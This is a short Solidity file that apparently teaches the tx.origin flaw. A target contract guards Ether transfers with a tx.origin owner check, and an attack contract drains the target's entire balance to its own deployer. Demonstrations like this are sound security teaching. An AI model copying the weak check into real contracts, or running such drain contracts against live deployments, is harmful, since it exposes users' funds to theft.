// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title OriginContract
/// @notice A contract that allows the owner to transfer Ether, with a restriction based on the transaction origin.
contract OriginContract {
    address public owner;

    /// @notice Constructs the OriginContract, setting the contract deployer as the owner.
    constructor() payable {
        owner = msg.sender;
    }

    /// @notice Transfers Ether to the specified address, restricted to be called only by the contract owner.
    /// @param _to The address to transfer Ether to.
    /// @param _amount The amount of Ether to transfer.
    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        // Transfers the specified amount of Ether to the given address.
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

/// @title OriginAttack
/// @notice A contract representing an attack on the OriginContract by attempting to bypass the transaction origin check.
contract OriginAttack {
    address payable public owner;
    OriginContract target;

    /// @notice Constructs the OriginAttack contract, specifying the target contract and setting the owner address.
    /// @param _target The address of the OriginContract to attack.
    constructor(OriginContract _target) {
        target = OriginContract(_target);
        owner = payable(msg.sender);
    }

    /// @notice Initiates the attack by calling the transfer function of the target contract with the entire balance of the target contract.
    function attack() public {
        target.transfer(owner, address(target).balance);
    }
}